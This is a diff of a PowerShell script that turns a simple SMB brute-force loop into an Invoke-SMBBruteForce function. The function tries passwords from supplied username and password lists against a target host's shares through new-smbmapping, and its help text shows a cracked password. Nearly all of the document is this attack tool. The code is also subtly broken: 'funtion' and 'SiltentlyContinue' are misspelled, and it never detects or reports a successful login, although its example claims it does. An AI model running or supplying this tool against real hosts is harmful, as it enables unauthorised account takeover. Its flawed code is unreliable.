@@ -1,33 +1,152 @@
- $target = '10.254.100.99' #this is the smb target, use IP or hostname
-$pass = 'passwords.txt' #create list of passwords to brute force with, change this variable to the location of that text file.
-$user = 'Admin' #local username of the machine that is the smb target, in this case it is just admin even though that account does not exist on the target machine.
-$fileSize = 1048576 # size in bytes, this is 1MB
-$filename = 'testfile.zip' # name of the test file that is generated and transfered
-$counter = 0 # do not touch 
-$passcount = (Get-Content $pass).Length # donot touch
+funtion Invoke-SMBBruteForce
 
-Write-Host "Senario 1: SMB Brute Force"
+{
+<#
+.SYNOPSIS
 
-foreach($ps in Get-Content $pass) {
+    This will use SMB to brute force a specific account when pointed at a local target. 
+    
+.DESCRIPTION
 
-    Write-Progress -Activity 'Testing SMB Brute Force' -CurrentOperation $ps -PercentComplete ((($counter++) / $passcount) * 100)
-    $u = $user -replace "^\.\\", "$host\"
-    try {
+    Author: Wbbigdave
+    License: GNU GPL v3
+    Required Dependancies: None
+    Optional Dependancies: None
+    Version: 1.0
 
-        if (new-smbmapping -remotepath \\$target -username $u -password $ps -EA SilentlyContinue) {
 
+.Example
+
+    PS C:\> Invoke-SMBBruteForce -Target 192.168.0.10 -Username "admin" -PasswordFile password.txt
+
+    [*]Trying to authenticate against \\192.168.0.10
+    [*]Loaded 2000 passwords from password file.
+    [*]Starting brute force operation.
+    [*]Success! Password: ilovemushrooms
+    [*]Completed.
+
+ .Parameter Target
+
+    A single target host, either an IP address or a hostname. 
+
+.Parameter Username
+
+    A single username in plaintext to be brute forced. This should be a loacl user account. 
+
+.Parameter UsernameFile
+
+    A file on the local host which contains a list of usernames. This can either be in txt line separated, or CSV comma
+    separated.     
+
+.Parameter Password
+
+    A comma separated list of passwords to use against the target account. 
+
+.Parameter PasswordFile
+
+    A file on the local host which contains a list of passwords. This can either be in txt line separated, or CSV comma
+    separated. 
+
+#>
+
+
+    [CmdletBinding(DefaultParameterSetName = "Plain")] Param(
+
+    [Parameter(Mandatory=$true)]
+    [String] $Target,
+
+    [Parameter(ParameterSetName = "Files", mandatory=$false)]
+    [Parameter(ParameterSetName = "Plain", Mandatory=$true)]
+    [String] $Username,
+
+    [Parameter(ParameterSetName = "Files", mandatory=$false)]
+    [String] $UsernameFile,
+
+    [Parameter(ParameterSetName = "Files", mandatory=$false)]
+    [Parameter(ParameterSetName = "Plain", Mandatory=$true)]
+    [String] $Password,
+
+    [Parameter(ParameterSetName = "Files", mandatory=$false)]
+    [String] $PasswordFile
+    )
+
+    Begin
+    {
+
+        Write-Host "[*]Trying to authenticate against \\$target"
+
+        $SetName = $PsCmdlet.ParameterSetName
+        if($SetName -eq "Files")
+        {
+            if(!$Username)
+            {
+                foreach($user in get-content $UsernameFile)
+                {
+                    if(!$PasswordFile)
+                    {
+                        try 
+                        {
+                             new-smbmapping -remotepath \\$target -username $user -password $Password -EA SilentlyContinue
+                        }
+                        catch 
+                        {
+                             write-host "Unknown error Occured"
+                             throw
+                        }
+
+                    }
+                    else
+                    {
+                        foreach($pw in get-content $PasswordFile)
+                        {
+                            try
+                            {
+                                new-smbmapping -remotepath \\$target -username $user -password $pw -EA SiltentlyContinue
+                            }
+                            catch
+                            {
+                                Write-Host "Unknown Error Occured"
+                                throw
+                            }
+                        }
+                    }
+                
+                }
+            }
+            else
+            {
+                $user = $username
+                if(!$PasswordFile)
+                {
+                    try 
+                    {
+                         new-smbmapping -remotepath \\$target -username $user -password $Password -EA SilentlyContinue
+                    }
+                    catch 
+                    {
+                         write-host "Unknown error Occured"
+                         throw
+                    }
+
+                }
+                else
+                {
+                    foreach($pw in get-content $PasswordFile)
+                    {
+                        try
+                        {
+                            new-smbmapping -remotepath \\$target -username $user -password $pw -EA SiltentlyContinue
+                        }
+                        catch
+                        {
+                            Write-Host "Unknown Error Occured"
+                            throw
+                        }
+                    }
+                }
             
-
-    
-
-        } 
-
-    
-
-    } catch {
-
-        Write-Host "Error"
-
+            }
+        }
     }
 
-} 
+}
